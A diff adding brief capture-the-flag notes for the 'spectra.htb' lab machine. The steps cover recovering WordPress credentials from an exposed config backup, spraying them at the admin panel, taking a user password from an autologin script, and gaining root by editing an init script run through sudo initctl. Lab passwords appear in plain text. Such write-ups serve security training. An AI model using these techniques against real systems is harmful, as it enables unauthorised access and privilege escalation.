@@ -1,0 +1,15 @@
+THINGS LEARNT:
+
+[+] Do proper enumeration. Cannot stress enough how important 'Try Harder' is.
+[+] Just because a link is broke, don't assume it's a dead end. Seen here with the testing directory hiding wp-config
+
+
+PROCESS:
+
+[1] view-source:http://spectra.htb/testing/wp-config.php.save
+[2] spray creds against wp admin portal - administrator:devteam01
+[3] see autologin script in /opt - mentioned file points to credentials katie:SummerHereWeCome!!
+[4] sudo -l to see /sbin/initctl has global sudo perms
+[5] edit any script in /etc/init/ -> cp /root/root.txt /home/katie/flag.txt && chmod 7777  /home/katie/flag.txt && sleep 15 && rm /home/katie/flag.txt
+[6] sudo /sbin/initctl start test1 --system
+[7] cat /home/katie/flag.txt
